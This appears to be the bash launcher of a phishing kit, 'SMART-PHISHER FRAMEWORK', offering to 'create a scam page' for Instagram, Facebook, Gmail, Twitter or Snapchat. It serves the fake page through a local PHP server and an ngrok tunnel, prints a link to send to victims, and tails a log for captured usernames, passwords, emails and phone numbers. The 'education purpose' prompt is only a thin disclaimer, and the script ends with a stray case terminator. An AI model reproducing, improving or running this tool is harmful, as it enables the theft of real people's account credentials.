#!/bin/bash
clear
echo ""
echo ""
echo ""
 echo -e $'\e[1;33m\e[0m' 
printf "\e[1;31m𝕃𝕆𝔸𝔻𝕀ℕ𝔾...\e[1;32m  SMART-PHISHER FRAMEWORK STARTING... \e[0m"
echo""
 echo -e $'\e[1;33m\e[0m' 
sleep 6
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m USE ONLY FOR EDUCATION PURPOSE                  \e[1;33m     (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh


echo ""
echo -e $'\e[1;31m         CREATE A SCAM PAGE\e[0m'
echo""
echo -e $'\e[1;33m            [01]= \e[1;32m INSTAGRAM  \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [02]= \e[1;32m FACEBOOK\e[0m'
echo""
echo""
echo -e $'\e[1;33m            [03]= \e[1;32m GMAIL  \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [04]= \e[1;32m TWITTER \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [05]= \e[1;32m SNAPCHAT \e[0m'
echo ""
echo""
echo""
echo""
echo""
                 read -p $'\e[1;35m[\e[1;35m-\e[1;35m]\e[1;31m S\e[1;34mET \e[1;31m Y\e[1;34mOUR \e[1;31m T\e[1;34mARGET \e[0m\e[1;31m      ------------>> : \e[0m\e[1;31m' option
		 case $option in
                        2) cd facebook/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[\e[0m\e[1;37m-\e[0m\e[1;34m]\e[0m\e[1;31m TARGET ----->>\e[1;32m           FACEBOOK   \e[0m'
                            echo -e $'\e[1;31m \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;32m [C-M] CREATING A LINK           \e[0m'
                            echo""
                            echo -e $'\e[1;34m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m Please wait   \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34mSEND THIS LINK TO ACCESS ACCOUNTS              \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                      1) cd instagram/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32mTARGET ------->>\e[1;31m        INSTAGRAM \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32m [C-M] CREATING A LINK   \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m PLEASE WAIT...  \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34mSEND THIS URL TO ACCESS ACCOUNTS             \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                     4) cd twitter/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m TARGET------->>\e[1;32m             TWITTER \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m  [C-M] CREATING A LINK\e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32mPlease wait...   \e[0m' 
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34mSEND THIS LINK TO ACCESS TARGET ACCOUNTS                \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                    5) cd snapchat/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31mTARGET ------->>\e[1;32m          SNAPCHAT \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m [C-M] CREATING A LINK... \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m Please Wait...  \e[0m' 
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m SEND THIS LINK TO ACCESS ACCOUNTS                 \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                     3)   cd email/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31mTARGET -------->>\e[1;34m          GMAIL \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32m [C-M]CREATING A LINK \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m Please wait...  \e[0  \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34mSEND THIS LINK TO ACCESS ACCOUNTS                  \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;

               esac
                ;;

